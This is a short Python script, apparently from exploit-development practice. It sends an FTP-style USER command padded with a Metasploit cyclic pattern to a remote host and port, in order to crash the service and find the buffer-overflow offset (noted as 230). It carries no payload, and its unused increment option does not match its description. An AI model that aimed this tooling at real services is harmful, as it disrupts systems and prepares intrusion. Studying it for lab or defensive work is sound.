#!/usr/bin/python

import argparse
import sys
import socket

parser = argparse.ArgumentParser("Simple fuzzer for buffer overflow exploits")

parser.add_argument(action='store', dest='rhost', type=str, help='remote host')
parser.add_argument(action='store', type=int, dest='rport', help='remote port')
parser.add_argument(
    '-i', '--increment', type=int, dest='increment', required=False, default=50,
    help='increase the size of the buffer by this much per attempt')

ap = parser.parse_args()
print("Sending exploit to " + ap.rhost + " " + str(ap.rport))

# offset 230
buf = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((ap.rhost, ap.rport))
    s.recv(1024)
    s.send("USER " + buf + "\r\n")
    s.recv(1024)
    print("Sent buffer length " + str(len(buf)))
    s.close()
except Exception:
    print("Check for crash in debugger. Find offset:")
    print(str(len(buf) - ap.increment))
    print("msf-pattern_create -l " + str(len(buf) - ap.increment))
    sys.exit()
